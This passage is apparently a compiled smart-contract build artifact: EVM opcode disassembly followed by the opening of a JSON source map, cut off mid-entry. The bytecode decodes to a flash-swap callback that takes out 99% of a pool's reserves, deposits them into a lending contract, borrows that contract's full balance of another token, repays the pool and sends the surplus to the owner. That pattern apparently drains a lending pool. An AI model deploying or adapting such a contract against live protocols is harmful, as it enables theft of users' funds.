JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 AND ADDRESS EQ PUSH2 0x160 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xA PUSH1 0x24 DUP3 ADD MSTORE PUSH10 0x3737BA1039B2B73232B9 PUSH1 0xB1 SHL PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH2 0x112 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x16E DUP3 DUP5 ADD DUP5 PUSH2 0xDBA JUMP JUMPDEST SWAP1 POP PUSH32 0x0 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND EQ DUP1 PUSH2 0x1E1 JUMPI POP PUSH32 0x0 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND EQ JUMPDEST PUSH2 0x21B JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xB PUSH1 0x24 DUP3 ADD MSTORE PUSH11 0x3BB937B733903A37B5B2B7 PUSH1 0xA9 SHL PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH2 0x112 JUMP JUMPDEST PUSH1 0x0 DUP6 ISZERO PUSH2 0x229 JUMPI DUP6 PUSH2 0x22B JUMP JUMPDEST DUP5 JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x3E8 PUSH2 0x23D DUP4 PUSH1 0x1 PUSH2 0xDDE JUMP JUMPDEST PUSH2 0x247 SWAP2 SWAP1 PUSH2 0xE0B JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH4 0x95EA7B3 PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB PUSH32 0x0 DUP2 AND PUSH1 0x4 DUP4 ADD MSTORE PUSH1 0x24 DUP3 ADD DUP4 SWAP1 MSTORE SWAP2 SWAP3 POP SWAP1 DUP5 AND SWAP1 PUSH4 0x95EA7B3 SWAP1 PUSH1 0x44 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x2BA JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x2DE SWAP2 SWAP1 PUSH2 0xE2D JUMP JUMPDEST POP PUSH1 0x40 MLOAD PUSH4 0x11F9FBC9 PUSH1 0xE2 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 DUP2 AND PUSH1 0x4 DUP4 ADD MSTORE PUSH1 0x24 DUP3 ADD DUP4 SWAP1 MSTORE PUSH32 0x0 AND SWAP1 PUSH4 0x47E7EF24 SWAP1 PUSH1 0x44 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x349 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x35D JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x0 DUP1 PUSH32 0x0 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP6 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SUB PUSH2 0x3C9 JUMPI POP POP PUSH1 0x2 SLOAD PUSH32 0x0 SWAP1 PUSH2 0x3F1 JUMP JUMPDEST POP POP PUSH1 0x1 SLOAD PUSH32 0x0 SWAP1 JUMPDEST PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB PUSH32 0x0 DUP2 AND PUSH1 0x4 DUP4 ADD DUP2 SWAP1 MSTORE SWAP2 PUSH4 0x4B8A3529 SWAP2 DUP6 SWAP2 SWAP1 DUP3 AND SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x463 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x487 SWAP2 SWAP1 PUSH2 0xE4F JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB NOT PUSH1 0xE0 DUP6 SWAP1 SHL AND DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND PUSH1 0x4 DUP4 ADD MSTORE PUSH1 0x24 DUP3 ADD MSTORE PUSH1 0x44 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x4CD JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x4E1 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x0 PUSH2 0x3E8 DUP6 PUSH2 0x3E7 PUSH2 0x4F8 SWAP2 SWAP1 PUSH2 0xDDE JUMP JUMPDEST PUSH2 0x502 SWAP2 SWAP1 PUSH2 0xE0B JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x3E8 PUSH2 0x514 DUP5 PUSH1 0x4 PUSH2 0xDDE JUMP JUMPDEST PUSH2 0x51E SWAP2 SWAP1 PUSH2 0xE0B JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH4 0xA9059CBB PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB PUSH32 0x0 DUP2 AND PUSH1 0x4 DUP4 ADD MSTORE PUSH1 0x24 DUP3 ADD DUP6 SWAP1 MSTORE SWAP2 SWAP3 POP SWAP1 DUP9 AND SWAP1 PUSH4 0xA9059CBB SWAP1 PUSH1 0x44 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x591 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x5B5 SWAP2 SWAP1 PUSH2 0xE2D JUMP JUMPDEST POP PUSH1 0x40 MLOAD PUSH4 0xA9059CBB PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB PUSH32 0x0 DUP2 AND PUSH1 0x4 DUP4 ADD MSTORE PUSH1 0x24 DUP3 ADD DUP4 SWAP1 MSTORE DUP6 AND SWAP1 PUSH4 0xA9059CBB SWAP1 PUSH1 0x44 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x625 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x649 SWAP2 SWAP1 PUSH2 0xE2D JUMP JUMPDEST POP PUSH2 0x652 PUSH2 0x9F4 JUMP JUMPDEST POP POP POP POP POP POP POP POP POP POP POP POP JUMP JUMPDEST PUSH2 0x668 PUSH2 0xC65 JUMP JUMPDEST PUSH2 0x672 PUSH1 0x0 PUSH2 0xCBF JUMP JUMPDEST JUMP JUMPDEST PUSH2 0x67C PUSH2 0xC65 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x60 PUSH32 0x0 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0x902F1AC PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x60 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x6DE JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x702 SWAP2 SWAP1 PUSH2 0xE84 JUMP JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB SWAP1 DUP2 AND PUSH1 0x2 SSTORE AND PUSH1 0x1 DUP2 SWAP1 SSTORE PUSH1 0x64 SWAP1 PUSH2 0x725 SWAP1 PUSH1 0x63 PUSH2 0xDDE JUMP JUMPDEST PUSH2 0x72F SWAP2 SWAP1 PUSH2 0xE0B JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB PUSH32 0x0 AND PUSH1 0x20 DUP3 ADD MSTORE SWAP2 SWAP4 POP ADD PUSH1 0x40 DUP1 MLOAD PUSH1 0x1F NOT DUP2 DUP5 SUB ADD DUP2 MSTORE SWAP1 DUP3 SWAP1 MSTORE PUSH4 0x22C0D9F PUSH1 0xE0 SHL DUP3 MSTORE SWAP2 POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB PUSH32 0x0 AND SWAP1 PUSH4 0x22C0D9F SWAP1 PUSH2 0x7C9 SWAP1 DUP6 SWAP1 PUSH1 0x0 SWAP1 ADDRESS SWAP1 DUP8 SWAP1 PUSH1 0x4 ADD PUSH2 0xF21 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x7E3 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x7F7 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH32 0x0 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0x902F1AC PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x60 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x859 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x87D SWAP2 SWAP1 PUSH2 0xE84 JUMP JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB SWAP1 DUP2 AND PUSH1 0x2 DUP2 SWAP1 SSTORE SWAP2 AND PUSH1 0x1 SSTORE PUSH1 0x64 SWAP1 PUSH2 0x8A1 SWAP1 PUSH1 0x63 PUSH2 0xDDE JUMP JUMPDEST PUSH2 0x8AB SWAP2 SWAP1 PUSH2 0xE0B JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB PUSH32 0x0 AND PUSH1 0x20 DUP3 ADD MSTORE SWAP2 SWAP4 POP ADD PUSH1 0x40 DUP1 MLOAD PUSH1 0x1F NOT DUP2 DUP5 SUB ADD DUP2 MSTORE SWAP1 DUP3 SWAP1 MSTORE PUSH4 0x22C0D9F PUSH1 0xE0 SHL DUP3 MSTORE SWAP2 POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB PUSH32 0x0 AND SWAP1 PUSH4 0x22C0D9F SWAP1 PUSH2 0x945 SWAP1 PUSH1 0x0 SWAP1 DUP7 SWAP1 ADDRESS SWAP1 DUP8 SWAP1 PUSH1 0x4 ADD PUSH2 0xF21 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x95F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x973 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP POP JUMP JUMPDEST PUSH2 0x983 PUSH2 0xC65 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND PUSH2 0x9E8 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x26 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x4F776E61626C653A206E6577206F776E657220697320746865207A65726F2061 PUSH1 0x44 DUP3 ADD MSTORE PUSH6 0x646472657373 PUSH1 0xD0 SHL PUSH1 0x64 DUP3 ADD MSTORE PUSH1 0x84 ADD PUSH2 0x112 JUMP JUMPDEST PUSH2 0x9F1 DUP2 PUSH2 0xCBF JUMP JUMPDEST POP JUMP JUMPDEST PUSH32 0x0 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0xA9059CBB PUSH2 0xA35 PUSH1 0x0 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP1 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH32 0x0 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xA99 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0xABD SWAP2 SWAP1 PUSH2 0xE4F JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB NOT PUSH1 0xE0 DUP6 SWAP1 SHL AND DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND PUSH1 0x4 DUP4 ADD MSTORE PUSH1 0x24 DUP3 ADD MSTORE PUSH1 0x44 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0xB08 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0xB2C SWAP2 SWAP1 PUSH2 0xE2D JUMP JUMPDEST POP PUSH32 0x0 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0xA9059CBB PUSH2 0xB6E PUSH1 0x0 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP1 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH32 0x0 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xBD2 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0xBF6 SWAP2 SWAP1 PUSH2 0xE4F JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB NOT PUSH1 0xE0 DUP6 SWAP1 SHL AND DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND PUSH1 0x4 DUP4 ADD MSTORE PUSH1 0x24 DUP3 ADD MSTORE PUSH1 0x44 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0xC41 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x9F1 SWAP2 SWAP1 PUSH2 0xE2D JUMP JUMPDEST PUSH1 0x0 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND CALLER EQ PUSH2 0x672 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD DUP2 SWAP1 MSTORE PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x4F776E61626C653A2063616C6C6572206973206E6F7420746865206F776E6572 PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH2 0x112 JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 DUP2 AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT DUP4 AND DUP2 OR DUP5 SSTORE PUSH1 0x40 MLOAD SWAP2 SWAP1 SWAP3 AND SWAP3 DUP4 SWAP2 PUSH32 0x8BE0079C531659141344CD1FD0A4F28419497F9722A3DAAFE3B4186F6B6457E0 SWAP2 SWAP1 LOG3 POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND DUP2 EQ PUSH2 0x9F1 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP1 PUSH1 0x0 PUSH1 0x80 DUP7 DUP9 SUB SLT ISZERO PUSH2 0xD3C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP6 CALLDATALOAD PUSH2 0xD47 DUP2 PUSH2 0xD0F JUMP JUMPDEST SWAP5 POP PUSH1 0x20 DUP7 ADD CALLDATALOAD SWAP4 POP PUSH1 0x40 DUP7 ADD CALLDATALOAD SWAP3 POP PUSH1 0x60 DUP7 ADD CALLDATALOAD PUSH8 0xFFFFFFFFFFFFFFFF DUP1 DUP3 GT ISZERO PUSH2 0xD72 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 DUP9 ADD SWAP2 POP DUP9 PUSH1 0x1F DUP4 ADD SLT PUSH2 0xD86 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 CALLDATALOAD DUP2 DUP2 GT ISZERO PUSH2 0xD95 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP10 PUSH1 0x20 DUP3 DUP6 ADD ADD GT ISZERO PUSH2 0xDA7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP7 SWAP10 SWAP6 SWAP9 POP SWAP4 SWAP7 POP PUSH1 0x20 ADD SWAP5 SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xDCC JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 CALLDATALOAD PUSH2 0xDD7 DUP2 PUSH2 0xD0F JUMP JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 PUSH1 0x0 NOT DIV DUP4 GT DUP3 ISZERO ISZERO AND ISZERO PUSH2 0xE06 JUMPI PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST POP MUL SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP3 PUSH2 0xE28 JUMPI PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH1 0x0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST POP DIV SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xE3F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 MLOAD DUP1 ISZERO ISZERO DUP2 EQ PUSH2 0xDD7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xE61 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD SWAP2 SWAP1 POP JUMP JUMPDEST DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP2 AND DUP2 EQ PUSH2 0xE7F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 PUSH1 0x60 DUP5 DUP7 SUB SLT ISZERO PUSH2 0xE99 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0xEA2 DUP5 PUSH2 0xE68 JUMP JUMPDEST SWAP3 POP PUSH2 0xEB0 PUSH1 0x20 DUP6 ADD PUSH2 0xE68 JUMP JUMPDEST SWAP2 POP PUSH1 0x40 DUP5 ADD MLOAD PUSH4 0xFFFFFFFF DUP2 AND DUP2 EQ PUSH2 0xEC9 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 SWAP2 POP POP SWAP3 POP SWAP3 POP SWAP3 JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD DUP1 DUP5 MSTORE PUSH1 0x0 JUMPDEST DUP2 DUP2 LT ISZERO PUSH2 0xEFA JUMPI PUSH1 0x20 DUP2 DUP6 ADD DUP2 ADD MLOAD DUP7 DUP4 ADD DUP3 ADD MSTORE ADD PUSH2 0xEDE JUMP JUMPDEST DUP2 DUP2 GT ISZERO PUSH2 0xF0C JUMPI PUSH1 0x0 PUSH1 0x20 DUP4 DUP8 ADD ADD MSTORE JUMPDEST POP PUSH1 0x1F ADD PUSH1 0x1F NOT AND SWAP3 SWAP1 SWAP3 ADD PUSH1 0x20 ADD SWAP3 SWAP2 POP POP JUMP JUMPDEST DUP5 DUP2 MSTORE DUP4 PUSH1 0x20 DUP3 ADD MSTORE PUSH1 0x1 DUP1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x40 DUP3 ADD MSTORE PUSH1 0x80 PUSH1 0x60 DUP3 ADD MSTORE PUSH1 0x0 PUSH2 0xF4E PUSH1 0x80 DUP4 ADD DUP5 PUSH2 0xED4 JUMP JUMPDEST SWAP7 SWAP6 POP POP POP POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xDF CREATE2 0xC0 INVALID RETURN EXTCODEHASH GASPRICE PUSH12 0x4EA61EA383CBB312E30C735D BALANCE SWAP2 0xBC NUMBER 0xAC PUSH32 0x28F4C1D64B8C64736F6C634300080D0033000000000000000000000000000000 ",
  "pcMap": {
    "0": {
      "offset": [
        569,
        3564
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x80"
    },
    "2": {
      "fn": null,
      "offset": [
        569,
        3564
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x40"
    },
    "4": {
      "fn": null,
      "offset": [
        569,
        3564
      ],
      "op": "MSTORE",
      "path": "3"
    },
    "5": {
      "fn": null,
      "offset": [
        569,
        3564
      ],
      "op": "CALLVALUE",
      "path": "3"
    },
    "6": {
      "fn": null,
      "offset": [
        569,
        3564
      ],
      "op": "DUP1",
      "path": "3"
    },
    "7": {
      "fn": null,
      "offset": [
        569,
        3564
      ],
      "op": "ISZERO",
      "path": "3"
    },
    "8": {
      "fn": null,
      "offset": [
        569,
        3564
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0x10"
    },
    "11": {
      "fn": null,
      "offset": [
        569,
        3564
      ],
      "op": "JUMPI",
      "path": "3"
    },
    "12": {
      "fn": null,
      "offset": [
        569,
        3564
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x0"
    },
    "14": {
      "fn": null,
      "offset": [
        569,
        3564
      ],
      "op": "DUP1",
      "path": "3"
    },
    "15": {
      "dev": "Cannot send ether to nonpayable function",
      "fn": null,
      "offset": [
        569,
        3564
      ],
      "op": "REVERT",
      "path": "3"
    },
    "16": {
      "fn": null,
      "offset": [
        569,
        3564
      ],
      "op": "JUMPDEST",
      "path": "3"
    },
    "17": {
      "fn": null,
      "offset": [
        569,
        3564
      ],
      "op": "POP",
      "path": "3"
    },
    "18": {
      "fn": null,
      "offset": [
        569,
        3564
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x4"
    },
    "20": {
      "fn": null,
      "offset": [
        569,
        3564
      ],
      "op": "CALLDATASIZE",
      "path": "3"
    },
    "21": {
      "fn": null,
      "offset": [
        569,
        3564
      ],
      "op": "LT",
      "path": "3"
    },
    "22": {
      "fn": null,
      "offset": [
        569,
        3564
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0x57"
    },
    "25": {
      "fn": null,
      "offset": [
        569,
        3564
      ],
      "op": "JUMPI",
      "path": "3"
    },
    "26": {
      "fn": null,
      "offset": [
        569,
        3564
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x0"
    },
    "28": {
      "fn": null,
      "offset": [
        569,
        3564
      ],
      "op": "CALLDATALOAD",
      "path": "3"
    },
    "29": {
      "fn": null,
      "offset": [
        569,
        3564
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0xE0"
    },
    "31": {
      "fn": null,
      "offset": [
        569,
        3564
      ],
      "op": "SHR",
      "path": "3"
    },
    "32": {
      "fn": null,
      "offset": [
        569,
        3564
      ],
      "op": "DUP1",
      "path": "3"
    },
    "33": {
      "fn": null,
      "offset": [
        569,
        3564
      ],
      "op": "PUSH4",
      "path": "3",
      "value": "0x10D1E85C"
    },
    "38": {
      "fn": null,
      "offset": [
        569,
        3564
      ],
      "op": "EQ",
      "path": "3"
    },
    "39": {
      "fn": null,
      "offset": [
        569,
        3564
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0x5C"
    },
    "42": {
